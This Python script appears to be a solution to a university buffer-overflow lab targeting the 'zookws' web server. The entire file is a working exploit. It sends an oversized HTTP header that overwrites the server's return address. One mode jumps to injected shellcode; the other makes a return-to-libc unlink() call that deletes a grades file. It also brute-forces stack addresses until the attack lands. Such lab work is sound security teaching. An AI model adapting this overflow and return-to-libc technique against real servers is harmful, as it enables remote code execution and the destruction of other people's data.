#!/usr/bin/python
import socket, struct, time, os, subprocess, sys

LIBC_UNLINK = 0x40a563b0
PAD = 536

def test(ebp, conf, mode):
    os.system("killall -9 zookld zookd zookfs zookd-exstack zookfs-exstack 2>/dev/null")
    time.sleep(0.3)
    open("/home/httpd/grades.txt", "w").close()
    subprocess.Popen(["./clean-env.sh", "./zookld", conf],
                       stdout=open("/dev/null", "w"))
    time.sleep(1)
    if mode == "ex3":
        sc = open("shellcode.bin").read()
        retto = struct.pack("<I", (ebp + 8) & 0xffffffff)
        msg = "A" * PAD + retto + sc
    else:
        param = ebp + 16
        tail = struct.pack("<I", LIBC_UNLINK & 0xffffffff)
        tail += "AAAA"
        tail += struct.pack("<I", param & 0xffffffff)
        tail += "/home/httpd/grades.txt"
        msg = "A" * PAD + tail
    req = "GET / HTTP/1.0\r\nexploit: " + msg + "\r\n\r\n"
    s = socket.socket()
    s.connect(("localhost", 8080))
    s.send(req)
    s.close()
    time.sleep(0.5)
    ok = not os.path.exists("/home/httpd/grades.txt")
    print("ebp=%#x mode=%s => %s" % (ebp, mode, "PASS" if ok else "fail"))
    os.system("killall -9 zookld zookd zookfs zookd-exstack zookfs-exstack 2>/dev/null")
    return ok

if __name__ == "__main__":
    addrs = [0xbfffde08, 0xffffde08, 0xffffd618, 0xbffff618, 0xbffffc90]
    mode = sys.argv[1] if len(sys.argv) > 1 else "ex4b"
    conf = "zook-exstack.conf" if mode == "ex3" else "zook.conf"
    for ebp in addrs:
        if test(ebp, conf, mode):
            sys.exit(0)
    # sweep
    for i in range(0, 0x3000, 0x40):
        ebp = 0xbfff0000 + i
        if test(ebp, conf, mode):
            sys.exit(0)
    print("FAILED")
